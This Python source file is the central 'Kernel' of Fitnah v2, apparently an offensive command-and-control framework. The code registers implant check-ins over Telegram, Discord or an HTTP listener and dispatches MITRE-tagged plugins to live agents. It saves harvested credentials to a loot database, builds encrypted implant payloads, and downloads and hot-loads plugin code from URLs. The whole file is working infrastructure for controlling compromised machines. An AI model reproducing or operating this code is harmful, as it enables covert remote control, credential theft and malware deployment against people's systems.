"""
Kernel — the central nervous system of Fitnah v2.

Wires together:
  - Config
  - Transports (Telegram primary, Discord fallback)
  - Router (failover logic)
  - C2 Server (task dispatch + ACK)
  - Telegram UI (inline keyboards)
  - Session Manager
  - Plugin Engine (auto-discovery)
  - Loot Store
  - Audit Log
  - Project Workspace
"""
from __future__ import annotations

import asyncio
import importlib
import json
import logging
import pkgutil
import shutil
from pathlib import Path
from typing import TYPE_CHECKING

from fitnah.config import Config
from fitnah.c2.router import Router
from fitnah.sdk.context import PluginContext
from fitnah.c2.server import C2Server
from fitnah.c2.http_listener import HTTPListener
from fitnah.c2.telegram_ui import TelegramUI
from fitnah.c2.transport.telegram import TelegramTransport
from fitnah.c2.transport.discord import DiscordTransport
from fitnah.orchestration.session_manager import SessionManager
from fitnah.orchestration.audit_log import AuditLog
from fitnah.orchestration.project import Project
from fitnah.loot.store import LootStore
from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.result import ModuleResult, Status
from fitnah.orchestration.scheduler import Scheduler

log = logging.getLogger(__name__)


class Kernel:
    """
    Instantiated once. Console and background C2 loop both hold a reference.
    All state lives here — sessions, plugins, loot, audit.
    """

    def __init__(self, cfg: Config, project: Project | None = None):
        self.cfg     = cfg
        self.project = project

        # ── core components ───────────────────────────────────────────────
        self.sessions = SessionManager(checkin_ttl=cfg.checkin_ttl)
        self.audit    = AuditLog(
            project.audit_log_path() if project else cfg.audit_log
        )
        self.loot     = LootStore(
            project.loot_dir() / "loot.db" if project else cfg.loot_db
        )
        self.plugins:   dict[str, BasePlugin] = {}
        self.scheduler: Scheduler = Scheduler()

        # ── transports ────────────────────────────────────────────────────
        transports = []

        tg_token = cfg.get("telegram", "token", default="")
        tg_oid   = cfg.telegram_operator_id

        if tg_token and tg_token not in ("YOUR_BOT_TOKEN_HERE", ""):
            tg = TelegramTransport(
                token=tg_token,
                operator_chat_id=tg_oid,
                allowed_ids=cfg.allowed_ids,
                on_callback=None,   # injected after UI is built
            )
            transports.append(tg)
        else:
            tg = None
            log.warning("[kernel] Telegram token not configured — skipping")

        if cfg.discord_enabled:
            dc_token = cfg.get("discord", "token", default="")
            dc_cid   = cfg.get("discord", "operator_channel_id", default=0)
            if dc_token and dc_token not in ("YOUR_DISCORD_BOT_TOKEN", ""):
                dc = DiscordTransport(
                    token=dc_token,
                    operator_channel_id=int(dc_cid),
                    allowed_ids=cfg.allowed_ids,
                )
                transports.append(dc)
            else:
                log.info("[kernel] Discord token not configured — fallback disabled")

        if not transports:
            raise RuntimeError(
                "No transports configured. "
                "Set telegram.token in config/framework.yaml"
            )

        # ── router + C2 server ────────────────────────────────────────────
        self.router = Router(
            transports,
            failover_threshold=cfg.failover_threshold,
            on_failover=self._on_transport_failover,
        )
        self.c2 = C2Server(self.router, task_timeout=cfg.task_timeout)

        # ── Telegram UI (inline keyboards) ────────────────────────────────
        self.ui = TelegramUI(
            sessions=self.sessions,
            c2=self.c2,
            router=self.router,
            audit=self.audit,
            loot=self.loot,
            operator_chat_id=tg_oid,
            operator_tag=cfg.operator_tag,
            on_new_agent=self._on_new_agent_notify,
            on_plugin_run=self._execute_plugin_async,
            on_builder_run=self._execute_builder_async,
        )

        # give UI access to the live plugin list
        self.ui._list_plugins = self.list_plugins

        # inject UI callback into Telegram transport
        if tg:
            tg._on_callback = self.ui.handle_callback

        # inject UI text middleware so shell/download input modes work
        self.c2._text_middleware = self._ui_text_middleware

        # ── HTTP listener (optional) ──────────────────────────────
        self._http: HTTPListener | None = None
        if cfg.get("http", "enabled", default=False):
            self._http = HTTPListener(
                host       = cfg.get("http", "host",      default="0.0.0.0"),
                port       = int(cfg.get("http", "port",  default=8888)),
                auth_key   = cfg.get("http", "agent_key", default=""),
                on_message = self.c2._handle_incoming,
            )

        # inject HTTP listener so C2 can queue tasks for HTTP implants
        if self._http:
            self.c2._http_listener = self._http

        # ── register C2 message handlers ──────────────────────────────────
        self.c2.register_handler("checkin",  self._handle_checkin)
        self.c2.register_handler("start",    self._handle_start)

        # stale-check background task handle
        self._stale_task: asyncio.Task | None = None
        self._running = False

    # ── lifecycle ─────────────────────────────────────────────────────────

    async def start(self, ready_event=None) -> None:
        """Connect transports, load plugins, start C2 loop."""
        self._running = True
        await self.router.connect_all()
        if self._http:
            await self._http.start()
        self._load_plugins()
        log.info(
            "[kernel] started — %d plugin(s) loaded  transport=%s",
            len(self.plugins), self.router.active_transport,
        )
        # signal main thread that startup is complete
        if ready_event is not None:
            ready_event.set()
        # background task: check for stale sessions every 60s
        self._stale_task = asyncio.create_task(
            self._stale_monitor(), name="stale-monitor"
        )
        await self.scheduler.start(self._schedule_execute)
        await self.c2.run()   # blocks until stop()

    async def stop(self) -> None:
        self._running = False
        if self._stale_task:
            self._stale_task.cancel()
        await self.scheduler.stop()
        if self._http:
            await self._http.stop()
        await self.router.disconnect_all()
        self.loot.close()
        log.info("[kernel] stopped")

    async def _schedule_execute(self, agent_id: str, plugin_name: str, params: dict) -> str:
        """Called by Scheduler when a scheduled plugin fires."""
        result = await self.execute(agent_id, plugin_name, params)
        return result.data if result and result.data else str(result)

    # ── plugin engine ─────────────────────────────────────────────────────

    def _load_plugins(self) -> None:
        try:
            import fitnah.plugins as plugin_pkg
        except ImportError:
            log.warning("[kernel] fitnah.plugins package not found")
            return

        pkg_path = Path(plugin_pkg.__file__).parent
        loaded = 0

        for _finder, mod_name, _ispkg in pkgutil.walk_packages(
            [str(pkg_path)], prefix="fitnah.plugins."
        ):
            try:
                mod = importlib.import_module(mod_name)
            except Exception as exc:
                log.warning("[kernel] import failed: %s — %s", mod_name, exc)
                continue

            for attr in vars(mod).values():
                if (
                    isinstance(attr, type)
                    and issubclass(attr, BasePlugin)
                    and attr is not BasePlugin
                    and attr.NAME
                    and attr.NAME not in self.plugins
                ):
                    try:
                        instance = attr()
                        instance.on_load()
                        self.plugins[attr.NAME] = instance
                        loaded += 1
                    except Exception as exc:
                        log.warning(
                            "[kernel] failed to instantiate %s: %s", attr.NAME, exc
                        )

        log.info("[kernel] %d plugin(s) loaded", loaded)

    def reload_plugins(self) -> int:
        """Hot-reload all plugins without restarting the server."""
        for p in self.plugins.values():
            try:
                p.on_unload()
            except Exception:
                pass
        self.plugins.clear()
        self._load_plugins()
        return len(self.plugins)

    # ── plugin execution ──────────────────────────────────────────────────

    async def execute(
        self,
        agent_id: str,
        plugin_name: str,
        raw_params: dict,
        operator: str = "cli",
    ) -> ModuleResult:
        """
        Execute a plugin against a live session.
        Validates params, dispatches to implant via C2, returns ModuleResult.
        """
        plugin = self.plugins.get(plugin_name)
        if not plugin:
            return ModuleResult.err(f"Plugin not found: {plugin_name!r}")

        session = self.sessions.get(agent_id)
        if not session:
            return ModuleResult.err(f"No session for agent_id={agent_id!r}")

        try:
            params = plugin.validate(raw_params)
        except ValueError as exc:
            return ModuleResult.err(f"Parameter error: {exc}")

        # build context — gives plugin sync access to C2 dispatch
        loop = asyncio.get_event_loop()
        ctx  = PluginContext(session=session, c2=self.c2, loop=loop, timeout=self.cfg.task_timeout)

        try:
            result = plugin.run(session, params, ctx=ctx)
        except Exception as exc:
            log.exception("[kernel] plugin %s raised an exception", plugin_name)
            return ModuleResult.err(f"Plugin error: {exc}")

        self.audit.plugin_run(operator, plugin_name, agent_id, raw_params,
                              result.status.value)
        session.touch(plugin_name, result.status.value)

        # auto-save credentials to loot
        if result and result.metadata.get("loot_kind"):
            kind  = result.metadata["loot_kind"]
            label = result.metadata.get("loot_label", plugin_name)
            data  = json.dumps(result.data) if not isinstance(result.data, (bytes, str)) else result.data
            loot_id = self.loot.add(agent_id, kind, label, data)
            result.metadata["loot_id"] = loot_id
            log.info("[kernel] loot saved: id=%d kind=%s", loot_id, kind)

        return result

    def install_plugin(self, path_or_url: str) -> str:
        """
        Install a plugin from a local .py file or URL into the plugins directory.
        Returns the installed plugin name on success.
        """
        import importlib.util

        src_path: Path | None = None

        if path_or_url.startswith("http://") or path_or_url.startswith("https://"):
            try:
                import requests  # type: ignore
                resp = requests.get(path_or_url, timeout=30)
                resp.raise_for_status()
                content = resp.text
            except Exception as exc:
                raise RuntimeError(f"Failed to fetch {path_or_url}: {exc}") from exc
            fname    = path_or_url.rstrip("/").split("/")[-1]
            if not fname.endswith(".py"):
                fname += ".py"
            tmp_path = Path(self.cfg.get("builder", "output_dir", default="build")) / fname
            tmp_path.parent.mkdir(parents=True, exist_ok=True)
            tmp_path.write_text(content, encoding="utf-8")
            src_path = tmp_path
        else:
            src_path = Path(path_or_url)
            if not src_path.exists():
                raise FileNotFoundError(f"Plugin file not found: {src_path}")

        # Detect CATEGORY from the file
        source = src_path.read_text(encoding="utf-8")
        category = "execution"   # default
        for line in source.splitlines():
            if "CATEGORY" in line and "=" in line:
                val = line.split("=", 1)[1].strip().strip('"\'')
                if val and val.isidentifier():
                    category = val
                break

        import fitnah.plugins as plugin_pkg
        pkg_path = Path(plugin_pkg.__file__).parent
        dest_dir = pkg_path / category
        dest_dir.mkdir(exist_ok=True)
        dest     = dest_dir / src_path.name

        shutil.copy2(src_path, dest)
        log.info("[kernel] plugin installed: %s → %s", src_path.name, dest)

        # Hot reload
        self._load_plugins()
        return src_path.stem

    def uninstall_plugin(self, name: str) -> bool:
        """Remove a plugin by NAME attribute. Returns True on success."""
        plugin = self.plugins.get(name)
        if not plugin:
            log.warning("[kernel] uninstall: plugin %r not found", name)
            return False

        import fitnah.plugins as plugin_pkg
        pkg_path = Path(plugin_pkg.__file__).parent
        # Find the file
        for py_file in pkg_path.rglob("*.py"):
            if py_file.name.startswith("__"):
                continue
            try:
                src = py_file.read_text(encoding="utf-8", errors="replace")
                if 'NAME' in src and (f'"{name}"' in src or f"'{name}'" in src):
                    try:
                        plugin.on_unload()
                    except Exception:
                        pass
                    self.plugins.pop(name, None)
                    py_file.unlink()
                    log.info("[kernel] plugin uninstalled: %s (%s)", name, py_file)
                    return True
            except Exception:
                continue
        return False

    def list_plugins(self, category: str = "") -> list[dict]:
        """Return list of plugin info dicts, optionally filtered by category."""
        result = []
        for p in self.plugins.values():
            if category and p.CATEGORY.lower() != category.lower():
                continue
            result.append({
                "name":        p.NAME,
                "category":    p.CATEGORY,
                "mitre":       p.MITRE or "",
                "description": p.DESCRIPTION,
                "author":      p.AUTHOR,
                "version":     p.VERSION,
            })
        result.sort(key=lambda x: (x["category"], x["name"]))
        return result

    def search_plugins(self, query: str) -> list[BasePlugin]:
        """Search plugins by name, category, or MITRE ID."""
        q = query.lower()
        return [
            p for p in self.plugins.values()
            if q in p.NAME.lower()
            or q in p.CATEGORY.lower()
            or q in (p.MITRE or "").lower()
            or q in (p.DESCRIPTION or "").lower()
        ]

    # ── C2 message handlers ───────────────────────────────────────────────

    async def _handle_checkin(
        self, chat_id: str, sender_id: str, args: str, router: Router
    ) -> None:
        """Implant checkin — register session, notify operator via Telegram UI."""
        try:
            info = json.loads(args) if args.strip().startswith("{") else {}
        except json.JSONDecodeError:
            info = {}

        agent_id = info.get("agent_id") or sender_id
        session, is_new = self.sessions.register(
            agent_id,
            hostname=info.get("hostname", "unknown"),
            os=info.get("os", "unknown"),
            arch=info.get("arch", "x64"),
            username=info.get("username", "unknown"),
            ip=info.get("ip", ""),
            priv_level=info.get("priv_level", "user"),
            transport="telegram",
            group_id=chat_id,
        )
        self.audit.checkin(agent_id, info)

        if is_new:
            log.info("[kernel] new agent: %s", session.one_line())
            # notify operator via Telegram UI
            tg = self._get_telegram_transport()
            if tg and tg.bot:
                asyncio.create_task(
                    self.ui.notify_new_agent(session, tg.bot),
                    name=f"notify-{sender_id}",
                )
        else:
            log.debug("[kernel] checkin update: %s", session.agent_id)

        # only send ACK via router for Telegram sessions (HTTP sessions get ACK in HTTP response)
        if chat_id.lstrip("-").isdigit():
            await router.send(chat_id, json.dumps({"type": "ACK", "id": "checkin", "status": "ok"}))

    async def _handle_start(
        self, chat_id: str, sender_id: str, args: str, router: Router
    ) -> None:
        """Operator /start — show main menu via Telegram UI."""
        log.info("[kernel] /start from sender=%s chat=%s", sender_id, chat_id)
        tg = self._get_telegram_transport()
        if not tg:
            log.warning("[kernel] /start: no Telegram transport found")
            return
        if not tg.bot:
            log.warning("[kernel] /start: tg.bot is None")
            return
        try:
            await self.ui._send_main_menu(tg.bot, chat_id)
            log.info("[kernel] /start: main menu sent to chat=%s", chat_id)
        except Exception as exc:
            log.exception("[kernel] /start: failed to send main menu: %s", exc)

    # ── UI text middleware ────────────────────────────────────────────────

    async def _ui_text_middleware(
        self, chat_id: str, sender_id: int, text: str
    ) -> bool:
        """
        Called by C2Server for every non-JSON operator text message.
        Delegates to TelegramUI so shell/download input modes work.
        Returns True if the UI consumed the message (don't route as command).
        """
        tg = self._get_telegram_transport()
        if not tg or not tg.bot:
            return False
        return await self.ui.handle_text(chat_id, sender_id, text, tg.bot)

    # ── event callbacks ───────────────────────────────────────────────────

    def _on_transport_failover(self, from_transport: str, to_transport: str) -> None:
        self.audit.transport_event("failover", f"{from_transport}→{to_transport}")
        log.warning("[kernel] transport failover: %s → %s", from_transport, to_transport)
        tg = self._get_telegram_transport()
        if tg and tg.bot:
            asyncio.create_task(
                self.ui.notify_transport_event(
                    "Failover", from_transport, to_transport, tg.bot
                ),
                name="notify-failover",
            )

    async def _execute_plugin_async(
        self, agent_id: str, plugin_name: str, params: dict
    ) -> "ModuleResult":
        """
        Async wrapper called by TelegramUI to run a plugin.
        Runs plugin.run() in a thread executor so ctx.send() can block
        without deadlocking the event loop.
        """
        plugin = self.plugins.get(plugin_name)
        if not plugin:
            return ModuleResult.err(f"Plugin not found: {plugin_name!r}")

        session = self.sessions.get(agent_id)
        if not session:
            return ModuleResult.err(f"No session for agent_id={agent_id!r}")

        try:
            validated = plugin.validate(params)
        except ValueError as exc:
            return ModuleResult.err(f"Parameter error: {exc}")

        loop = asyncio.get_running_loop()
        ctx  = PluginContext(session=session, c2=self.c2, loop=loop,
                             timeout=self.cfg.task_timeout)

        # plugin.run() is synchronous and blocks via ctx.send() → run_coroutine_threadsafe
        # run it in a thread so the event loop stays free to process the dispatched tasks
        try:
            result = await loop.run_in_executor(
                None, lambda: plugin.run(session, validated, ctx=ctx)
            )
        except Exception as exc:
            log.exception("[kernel] plugin %s raised", plugin_name)
            return ModuleResult.err(f"Plugin error: {exc}")

        self.audit.plugin_run("telegram", plugin_name, agent_id, params,
                              result.status.value)
        session.touch(plugin_name, result.status.value)

        if result and result.metadata.get("loot_kind"):
            kind    = result.metadata["loot_kind"]
            label   = result.metadata.get("loot_label", plugin_name)
            data    = (json.dumps(result.data)
                       if not isinstance(result.data, (bytes, str)) else result.data)
            loot_id = self.loot.add(agent_id, kind, label, data)
            result.metadata["loot_id"] = loot_id

        return result

    async def _execute_builder_async(self, fmt: str, arch: str, enc: str,
                                     sleep: int, jitter: int):
        """Run BuildEngine.build() in an executor so the event loop stays free."""
        from fitnah.builder import BuildEngine, BuildRequest
        from fitnah.builder.models import OutputFormat, Arch, Encrypt

        try:
            fmt_e  = OutputFormat(fmt)
            arch_e = Arch(arch)
            enc_e  = Encrypt(enc)
        except ValueError as exc:
            from fitnah.builder.models import BuildResult
            return BuildResult(ok=False, error=f"Invalid parameter: {exc}")

        req = BuildRequest(
            bot_token=self.cfg.get("telegram", "token", default=""),
            chat_id=str(self.cfg.telegram_operator_id),
            agent_id="builder",
            sleep=sleep,
            jitter=jitter,
            format=fmt_e,
            arch=arch_e,
            encrypt=enc_e,
            output_dir=str(self.cfg.build_dir if hasattr(self.cfg, "build_dir") else "build"),
        )

        engine = BuildEngine(output_dir=req.output_dir)
        loop   = asyncio.get_running_loop()
        result = await loop.run_in_executor(None, engine.build, req)
        self.audit.plugin_run("builder", fmt, "local", {"arch": arch, "enc": enc},
                              "ok" if result.ok else "error")
        return result

    async def _on_new_agent_notify(self, session) -> None:
        """Called by TelegramUI when a new agent is registered."""

    # ── stale session monitor ─────────────────────────────────────────────

    async def _stale_monitor(self) -> None:
        """Periodically check for sessions that have gone stale."""
        notified: set[str] = set()
        while self._running:
            await asyncio.sleep(60)
            stale = self.sessions.stale()
            for s in stale:
                if s.agent_id not in notified:
                    log.info("[kernel] session stale: %s", s.agent_id)
                    self.audit.session_event("stale", s.agent_id)
                    notified.add(s.agent_id)
                    tg = self._get_telegram_transport()
                    if tg and tg.bot:
                        asyncio.create_task(
                            self.ui.notify_agent_stale(s, tg.bot),
                            name=f"notify-stale-{s.agent_id}",
                        )
            # un-notify sessions that have checked back in
            alive_ids = {s.agent_id for s in self.sessions.alive()}
            notified &= alive_ids

    # ── helpers ───────────────────────────────────────────────────────────

    def _get_telegram_transport(self) -> TelegramTransport | None:
        for t in self.router._transports:
            if isinstance(t, TelegramTransport):
                return t
        return None

    # ── status ────────────────────────────────────────────────────────────

    def status(self) -> str:
        return (
            f"  Transport : {self.router.active_transport}\n"
            f"  Sessions  : {len(self.sessions.alive())} alive / "
            f"{self.sessions.count()} total\n"
            f"  Plugins   : {len(self.plugins)}\n"
            f"  Project   : {self.project.name if self.project else '—'}\n"
            + self.c2.stats_display()
        )
